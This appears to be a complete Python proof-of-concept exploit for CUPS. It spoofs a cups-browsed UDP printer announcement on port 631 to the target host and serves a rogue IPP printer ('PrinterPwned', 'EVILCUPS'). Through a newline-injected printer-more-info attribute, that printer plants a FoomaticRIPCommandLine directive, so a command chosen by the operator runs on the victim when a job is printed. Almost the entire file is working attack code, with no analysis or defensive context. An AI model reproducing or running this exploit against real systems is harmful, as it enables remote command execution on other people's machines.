import logging
import socket
import threading
import time
import sys
import base64
from ippserver.server import IPPServer, IPPRequestHandler
from ippserver.behaviour import StatelessPrinter
from ippserver.constants import OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
from ippserver.request import IppRequest


class IPPServerManager:
    """Manages the IPP server lifecycle (start and stop)."""
    
    def __init__(self, server_instance):
        self.server_instance = server_instance
        self.server_thread = None

    def __enter__(self):
        """Start the server in a separate thread when entering the context."""
        print(f"Starting IPP server at {self.server_instance.server_address}")
        self.server_thread = threading.Thread(target=self.server_instance.serve_forever, daemon=True)
        self.server_thread.start()
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        """Shutdown the server and stop the thread on exit."""
        print("Stopping the server...")
        self.server_instance.shutdown()
        self.server_thread.join()


class PrinterPwned(StatelessPrinter):
    """Malicious printer built on StatelessPrinter with additional attributes for testing command injection via FoomaticRIPCommandLine."""

    def __init__(self, command):
        self.command = command
        super(PrinterPwned, self).__init__()

    def handle_postscript(self, req, psfile):
        """Override the handle_postscript to simulate payload delivery."""
        print("Simulated postscript processing. Payload delivered.")

    def printer_list_attributes(self):
        """According to RFC2911, section 4.4. Returns printer attributes."""
        attributes = super().printer_list_attributes()
        
        attributes.update({
            # Command Injection
            (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
                f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()
            ]
        })
        return attributes

    def operation_printer_list_response(self, req, _psfile):
        """Handle a request for printer attributes."""
        print("\ntarget connected, sending payload ...")
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes
        )


def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
    """Send a UDP packet to announce the malicious printer."""
    print(f"Sending UDP packet to {ip}:{port}...")

    printer_type = 2
    printer_state = '3'  # Idle state
    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/EVILCUPS'
    printer_location = '"Pwned Location"'
    printer_info = '"Pwned Printer"'
    printer_model = '"HP LaserJet 1020"'
    packet = f"{printer_type:x} {printer_state} {printer_uri} {printer_location} {printer_info} {printer_model} \n"
    print(f"Packet content:\n{packet}")

    # Send the UDP packet
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Create a UDP socket
    sock.sendto(packet.encode('utf-8'), (ip, port))  # Send the packet to the target



def run(server):
    """Start the server and keep it running until interrupted."""
    with IPPServerManager(server):
        try:
            while True:
                time.sleep(0.5)  # Sleep to avoid high CPU usage
        except KeyboardInterrupt:
            print("Server interrupted by user.")


if __name__ == "__main__":
    
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <LOCAL_HOST> <TARGET_HOST>")
        sys.exit(1)
        
    # Assign arguments to variables
    SERVER_HOST = sys.argv[1]
    SERVER_PORT = 12349
    TARGET_HOST = sys.argv[2]
    COMMAND = sys.argv[3]  # Command for the PrinterPwned class

    # Create and start the IPP server
    server = IPPServer((SERVER_HOST, SERVER_PORT), IPPRequestHandler, PrinterPwned(COMMAND))
    threading.Thread(target=run, args=(server,)).start()

    # Send the UDP packet to the target
    TARGET_PORT = 631  # Common port for IPP printers
    send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)


